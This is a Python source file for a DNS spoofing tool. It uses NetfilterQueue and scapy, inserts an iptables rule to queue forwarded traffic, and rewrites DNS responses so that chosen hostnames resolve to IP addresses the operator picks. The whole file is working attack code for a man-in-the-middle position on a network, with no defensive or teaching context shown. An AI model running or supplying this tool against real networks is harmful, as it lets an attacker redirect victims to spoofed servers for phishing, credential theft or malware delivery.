import os
from netfilterqueue import NetfilterQueue
from scapy.all import *
from scapy.layers.dns import *


class dns_spoofing:
    def __init__(self, hostDict, queueNum):
        self.hostDict = hostDict
        self.queueNum = queueNum
        self.queue = NetfilterQueue()

    def callBack(self, packet):
        scapyPacket = IP(packet.get_payload())
        if scapyPacket.haslayer(DNSRR):
            try:
                print(f'[original] {scapyPacket[DNSRR].summary()}')
                queryName = scapyPacket[DNSQR].qname
                if queryName in self.hostDict:
                    scapyPacket[DNS].an = DNSRR(rrname=queryName, rdata=self.hostDict[queryName])
                    scapyPacket[DNS].ancount = 1
                    del scapyPacket[IP].len
                    del scapyPacket[IP].chksum
                    del scapyPacket[UDP].len
                    del scapyPacket[UDP].chksum
                    print(f'[modified] {scapyPacket[DNSRR].summary()}')
                else:
                    print(f'[not modified] {scapyPacket[DNSRR].rdata}')
            except IndexError as error:
                print("Error: ", error)
            packet.set_payload(bytes(scapyPacket))
            return packet.accept()

    def __call__(self):
        print("Start snoofing")
        os.system(f'sudo iptables -I FORWARD -j NFQUEUE --queue-num {self.queueNum}')
        self.queue.bind(self.queueNum, self.callBack)
        try:
            self.queue.run()
        except KeyboardInterrupt:
            os.system(f'sudo iptables -D FORWARD -j NFQUEUE --queue-num {self.queueNum}')
            print("iptable rule flushed")
